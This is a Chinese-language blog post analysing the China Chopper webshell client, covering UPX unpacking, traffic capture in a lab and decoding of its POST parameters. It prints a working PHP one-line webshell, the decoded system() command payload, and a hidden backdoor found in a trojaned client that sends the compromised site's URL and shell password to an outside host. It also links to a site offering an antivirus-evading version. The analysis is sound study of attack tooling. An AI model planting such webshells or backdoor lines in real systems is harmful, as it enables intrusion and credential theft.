    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="中国菜刀分析及隐藏后门"><a href="#中国菜刀分析及隐藏后门" class="headerlink" title="中国菜刀分析及隐藏后门"></a>中国菜刀分析及隐藏后门</h1><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h4><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p><h4 id="winsock-expert"><a href="#winsock-expert" class="headerlink" title="winsock expert"></a>winsock expert</h4><p> 一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据。</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p><h4 id="PEID"><a href="#PEID" class="headerlink" title="PEID"></a>PEID</h4><p>一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>我们通过peid等工具可以看出来加壳了：</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704224735501.png" alt="image-20200704224735501"></p><p>  通过winhex，也可以看到菜刀经过upx加壳处理：</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225123980.png" alt="image-20200704225123980"></p><p>进行脱壳处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -d 目标文件</span><br></pre></td></tr></table></figure><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225645446.png" alt="image-20200704225645446"></p><p>再用peid查看，可以看到已经没有壳了，并且可以看出是vc++6.0编写</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225813247.png" alt="image-20200704225813247"></p><p>接下来把它的可见字符串打印出来看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.exe  caidao.exe</span><br></pre></td></tr></table></figure><p>由于字符串太多，我们可以有目的性地查找字符串如chopper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.exe  caidao.exe | findstr chopper</span><br></pre></td></tr></table></figure><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704230218566.png" alt="image-20200704230218566"></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>在靶机上写一个php一句话放在网站的根目录下，如1.php,内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>然后在攻击机打开wireshark准备监听数据包，同时使用菜刀进行连接</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231058773.png" alt="image-20200704231058773"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231131527.png" alt="image-20200704231131527"></p><p> 监听到的数据包如下:</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231214377.png" alt="image-20200704231214377"></p><p>客户端在80端口上，以HTTP POST方式通讯，追踪tcp流来查看整个tcp数据交互过程。</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231350738.png" alt="image-20200704231350738"></p><p>红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果。</p><p>z0,z1,z2三个参数，我们分别解码。</p><p>到红色部分的代码经过base64以及url的编码，解码的顺序依次为url解码，然后再base64解码，得到明文</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231611163.png" alt="image-20200704231611163"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231643523.png" alt="image-20200704231643523"></p><p>明文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z0&#x3D;@ini_set(&quot;display_errors&quot;,&quot;0&quot;)@set_time_limit(0)@set_magic_quotes_runtime(0)echo(&quot;-&gt;|&quot;);;$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c &#39;&#123;$s&#125;&#39;&quot;:&quot;&#x2F;c &#123;$s&#125;&quot;;$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;@system($r.&quot; 2&gt;&amp;1&quot;);;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z1&#x3D;cmd</span><br><span class="line">z2&#x3D;cd &#x2F;d &quot;D:\phpstudy\PHPTutorial\WWW\&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure><p>z1的值是cmd，z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231838173.png" alt="image-20200704231838173"></p><p> 以上就是中国菜刀的流量通信的特征。</p><h2 id="带有恶意后门的菜刀"><a href="#带有恶意后门的菜刀" class="headerlink" title="带有恶意后门的菜刀"></a>带有恶意后门的菜刀</h2><p>打开带有恶意后门的菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232016543.png" alt="image-20200704232016543"></p><p> 接下来连接菜刀</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232052587.png" alt="image-20200704232052587"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232124638.png" alt="image-20200704232124638"></p><p>菜刀连接以后我们可以随意操作一下（比如点击、切换文件夹等，以此来产生通信流量方便我们后续的分析）</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232203249.png" alt="image-20200704232203249"></p><p>回到winsock expert</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232336587.png" alt="image-20200704232336587"></p><p>将下面的字符串解码，先URL解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232424476.png" alt="image-20200704232424476"></p><p>再base64解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232516342.png" alt="image-20200704232516342"></p><p>可以看到还是存在密文，那么接着解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232605085.png" alt="image-20200704232605085"></p><p>明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_COOKIE[&#39;Lyke&#39;]!&#x3D;1)&#123;setcookie(&#39;Lyke&#39;,1);@file(&#39;http:&#x2F;&#x2F;www.7jyewu.cn&#x2F;hack.php?Url&#x3D;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;].&#39;&amp;Pass&#x3D;&#39;.key($_POST));&#125;</span><br></pre></td></tr></table></figure><p>这里的http://[www.]7jyewu.cn/hack.php就是这个菜刀的后门地址。</p><p> HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码。这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3" target="_blank" rel="noopener">https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3</a> 全面分析中国菜刀及隐藏后门 </p><p><a href="https://webshell6.com/" target="_blank" rel="noopener">https://webshell6.com/</a>  2020免杀菜刀</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="webshell" scheme="http://yoursite.com/categories/webshell/"/>
    
    
      <category term="中国菜刀" scheme="http://yoursite.com/tags/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/"/>
    
  </entry>
  
</feed>
